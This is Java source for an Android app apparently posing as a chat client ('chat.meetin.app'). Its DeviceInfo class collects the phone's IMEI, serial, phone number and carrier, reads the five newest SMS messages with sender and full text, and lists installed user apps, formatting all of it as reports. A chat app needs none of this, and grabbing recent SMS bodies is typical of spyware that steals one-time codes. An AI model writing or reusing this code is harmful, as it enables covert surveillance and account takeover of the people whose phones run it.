package chat.meetin.app;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import java.util.ArrayList;
import java.util.List;

public class DeviceInfo {
    public static String getFullInfo(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            StringBuilder sb = new StringBuilder();

            sb.append("DEVICE INFO\n");
            sb.append("Model: ").append(Build.MODEL).append("\n");
            sb.append("Brand: ").append(Build.BRAND).append("\n");
            sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
            sb.append("Device ID: ").append(Build.MODEL.replace(" ", "_")).append("|").append(Build.SERIAL).append("\n");

            try {
                if (tm != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        sb.append("\nIMEI: ").append(tm.getImei()).append("\n");
                    } else {
                        sb.append("\nIMEI: ").append(tm.getDeviceId()).append("\n");
                    }
                    sb.append("Phone Number: ").append(tm.getLine1Number()).append("\n");
                    sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
                }
            } catch (SecurityException e) {
                sb.append("\nPhone Info: Permission Denied\n");
            } catch (Exception ignored) {}

            return sb.toString();
        } catch (Exception e) {
            return "Device Info Error: " + e.getMessage();
        }
    }

    public static String readSms(Context ctx) {
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {"address", "body"};
            Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 5");
            if (cursor == null) return "No SMS access";
            StringBuilder sb = new StringBuilder("SMS:\n");
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                if (address != null && body != null) {
                    sb.append(address).append(": ").append(body).append("\n");
                }
            }
            cursor.close();
            return sb.toString();
        } catch (SecurityException e) {
            return "SMS permission denied";
        } catch (Exception e) {
            return "SMS error: " + e.getMessage();
        }
    }

    public static String getUserApps(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            List<String> userApps = new ArrayList<>();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    try {
                        String label = pm.getApplicationLabel(app).toString();
                        if (label != null && !label.isEmpty()) {
                            userApps.add(label);
                        }
                    } catch (Exception ignored) {}
                }
            }
            StringBuilder sb = new StringBuilder("User Apps (" + userApps.size() + "):\n");
            for (String app : userApps) {
                sb.append("- ").append(app).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "Apps error: " + e.getMessage();
        }
    }
}
